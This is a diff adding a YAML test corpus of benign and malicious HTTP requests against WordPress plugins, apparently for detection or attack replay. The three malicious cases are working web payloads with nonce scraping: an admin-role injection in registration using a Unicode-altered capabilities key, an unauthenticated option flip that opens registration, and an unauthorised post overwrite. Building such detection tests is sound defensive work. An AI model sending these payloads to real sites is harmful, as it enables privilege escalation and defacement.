@@ -1,0 +1,114 @@
+- name: corp-normal-home
+  malicious: false
+  correlation: marker
+  request:
+    method: GET
+    path: /
+
+- name: corp-normal-registration-page
+  malicious: false
+  correlation: marker
+  request:
+    method: GET
+    path: /wp-login.php
+    params:
+      action: register
+
+- name: corp-normal-search
+  malicious: false
+  correlation: marker
+  request:
+    method: GET
+    path: /
+    params:
+      s: "quarterly report"
+
+- name: corp-normal-registration
+  malicious: false
+  correlation: marker
+  request:
+    method: POST
+    path: /register/
+    prefetch:
+      from: /register/
+      pattern: 'name="_wpnonce" value="([a-f0-9]+)"'
+    data:
+      form_id: "5"
+      _wpnonce: "{nonce}"
+      um_request: ""
+      _wp_http_referer: "/register/"
+      "user_login-4": "newcomer"
+      "first_name-4": "New"
+      "last_name-4": "Comer"
+      "user_email-4": "newcomer@example.com"
+      "user_password-4": "Welcome-2026-aA"
+      "confirm_user_password-4": "Welcome-2026-aA"
+
+- name: corp-rogue-admin
+  malicious: true
+  stage: escalate-privileges
+  technique: T1068
+  pattern: CAPEC-233
+  expect: "[administrator]"
+  correlation: marker
+  request:
+    method: POST
+    path: /register/
+    prefetch:
+      from: /register/
+      pattern: 'name="_wpnonce" value="([a-f0-9]+)"'
+    data:
+      form_id: "5"
+      _wpnonce: "{nonce}"
+      um_request: ""
+      _wp_http_referer: "/register/"
+      "user_login-4": "northwind_intern"
+      "first_name-4": "North"
+      "last_name-4": "Wind"
+      "user_email-4": "northwind_intern@example.com"
+      "user_password-4": "Str0ng-Pass-9271"
+      "confirm_user_password-4": "Str0ng-Pass-9271"
+      "wp_càpabilities[administrator]": "1"
+
+- name: corp-option-flip
+  malicious: true
+  stage: escalate-privileges
+  technique: T1190
+  pattern: CAPEC-1
+  expect: "users_can_register"
+  correlation: marker
+  request:
+    method: POST
+    path: /wp-admin/admin-ajax.php
+    prefetch:
+      from: /
+      pattern: '"ajaxSecurity":"([a-f0-9]+)"'
+    params:
+      action: "wpgdprc_process_action"
+      security: "{nonce}"
+    data:
+      data: '{"type":"save_setting","append":false,"option":"users_can_register","value":"1"}'
+
+- name: corp-content-write
+  malicious: true
+  stage: complete-mission
+  technique: T1565
+  pattern: CAPEC-242
+  expect: "rbsm_submit_post"
+  correlation: marker
+  request:
+    method: POST
+    path: /wp-admin/admin-ajax.php
+    prefetch:
+      from: /submit-a-story/
+      pattern: 'rbGlobalSubmissionSettings = {"nonce":"([a-f0-9]+)"'
+    data:
+      action: "rbsm_submit_post"
+      _nonce: "{nonce}"
+      formId: "1"
+      postId: "1"
+      title: "Defaced by an unauthenticated guest"
+      excerpt: "overwritten without owning this post"
+      content: "overwritten without owning this post"
+      userName: "Anonymous"
+      userEmail: "anon@example.com"
